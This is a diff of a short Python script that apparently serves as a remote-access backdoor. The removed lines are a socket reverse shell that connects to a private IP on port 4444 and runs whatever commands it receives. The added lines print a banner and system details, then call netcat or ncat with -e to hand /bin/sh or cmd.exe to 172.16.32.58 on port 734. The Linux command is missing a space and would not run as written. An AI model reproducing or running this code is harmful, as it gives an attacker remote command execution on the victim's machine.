@@ -1,25 +1,26 @@
+import platform
+import os
+import sysconfig
+import socket  
 def run():
-  import socket
-  import subprocess 
-  SERVER_HOST = "172.16.22.82"
-  SERVER_PORT = 4444
-  BUFFER_SIZE = 1024
-# create the socket object
-  s = socket.socket()
-# connect to the server
-  s.connect((SERVER_HOST, SERVER_PORT))
-# receive the greeting message
-  message = s.recv(BUFFER_SIZE).decode()
-  print("Server:", message)
-  while True:
-    # receive the command from the server
-      command = s.recv(BUFFER_SIZE).decode()
-      if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-          break
-    # execute the command and retrieve the results
-      output = subprocess.getoutput(command)
-    # send the results back to the server
-      s.send(output.encode())
-# close client connection
-  s.close()
+    hostname=socket.gethostname()   
+    IPAddr=socket.gethostbyname(hostname) 
+    iph='172.16.32.58'
+    print('')
+    print(' ############### # # # ##############')
+    print(' ####### ###### # #  # # ####### ####')
+    print(' ######   ##### ##    ## ######   ###')
+    print(' ####### #######  #  #  ######## ####')
+    print(' ################ ### ###############')
+    print('')
+    print('# OS name: ', platform.system())
+    if "Linux" in platform.system():
+        print('Linux: ', sysconfig.get_platform()) 
+        print(' IpAddress: ', IPAddr)
+        #os.system( 'nc -lvp 734 -e /bin/sh')
+        os.system('nc' + iph+ ' 734 -e /bin/sh')
+    elif "Windows" in platform.system():
+        print('Windows: ', sysconfig.get_platform()) 
+        print('Address ip: ', IPAddr)
+        #os.system('ncat -lvp 734 -e cmd.exe')
+        os.system('ncat '+ iph +' 734 -e cmd.exe')
